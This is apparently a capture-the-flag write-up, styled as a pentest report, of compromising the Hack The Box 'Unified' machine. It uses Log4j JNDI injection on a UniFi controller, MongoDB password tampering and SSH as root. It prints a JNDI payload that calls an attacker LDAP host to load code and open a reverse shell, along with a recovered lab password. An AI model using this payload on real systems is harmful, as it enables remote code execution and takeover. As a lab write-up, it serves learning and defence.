# Penetration Test Report: Hack The Box - Unified

## Executive Summary

This report details the penetration test of the "Unified" machine on the Hack The Box platform. The assessment identified a Ubiquiti UniFi Network Controller running a version susceptible to the Log4j vulnerability (CVE-2021-44228). By injecting a malicious JNDI lookup string into the authentication portal, initial access was achieved via Remote Code Execution (RCE). Subsequent local enumeration of the application's underlying database yielded plaintext management credentials, which were utilized to pivot via SSH and achieve full system compromise (root-level access).

## Reconnaissance & Enumeration

The engagement began with a comprehensive network scan using `nmap` to identify exposed services on the target.

**Key Open Ports:**

* **Port 22 (SSH):** Secure Shell.
* **Port 6789:** UniFi Discovery Protocol.
* **Port 8080 (HTTP):** UniFi Web Portal (Redirects to HTTPS).
* **Port 8443 (HTTPS):** UniFi Network Controller Web Interface.

### Web Application Enumeration

Navigating to port 8443 revealed a Ubiquiti UniFi Network Controller login portal. Intercepting the authentication process with Burp Suite demonstrated that login requests were sent as JSON data to the `/api/login` endpoint. Given the historical prevalence of Log4j vulnerabilities in enterprise Java applications, this endpoint was targeted for JNDI injection testing.

## Initial Access & Web Exploitation

To verify the presence of CVE-2021-44228, a basic JNDI lookup payload was injected into the `remember` parameter of the JSON authentication request. A local `tcpdump` listener captured the resulting LDAP callback, confirming the application was blindly executing lookups and was vulnerable to Log4j.

### Weaponization & Reverse Shell

To establish an interactive foothold, a Rogue-JNDI server was deployed on the attacking machine to host a malicious Java class containing a Base64-encoded reverse shell payload.

The intercepted Burp Suite request was modified to point the vulnerable `remember` parameter to the malicious LDAP server:

```json
{
  "username": "hacker",
  "password": "hacker",
  "remember": "${jndi:ldap://<ATTACKER_IP>:1389/o=reference}",
  "strict": true
}


Upon submitting the forged request, the UniFi controller reached out to the Rogue-JNDI server, downloaded the malicious reference, and executed the payload. This successfully established a reverse shell connection over port 4444, granting interactive command-line access as the `unifi` service account and allowing for the retrieval of `user.txt`.

## Privilege Escalation

Operating as the standard user `unifi`, local enumeration was conducted to identify privilege escalation vectors. The UniFi application utilizes a local instance of MongoDB to store its configuration and credentials.

By interacting with the local MongoDB service on port 27014, the administrative password hash for the UniFi web dashboard was overwritten with a known value. This allowed for authenticated access to the UniFi web management interface as the administrator.

Reviewing the controller's configuration settings within the dashboard revealed the plaintext "Device Authentication" password utilized for SSH management of connected access points:

* **Password:** `NotACrackablePassword4U2022`

### Root Compromise

Armed with the plaintext management password, lateral movement and privilege escalation were achieved simultaneously. The credentials were used to authenticate directly to the target machine's exposed SSH service on port 22.

ssh root@10.129.101.35


This authenticated session successfully spawned a shell as `root`, granting full administrative control over the Unified server and allowing for the retrieval of `root.txt`.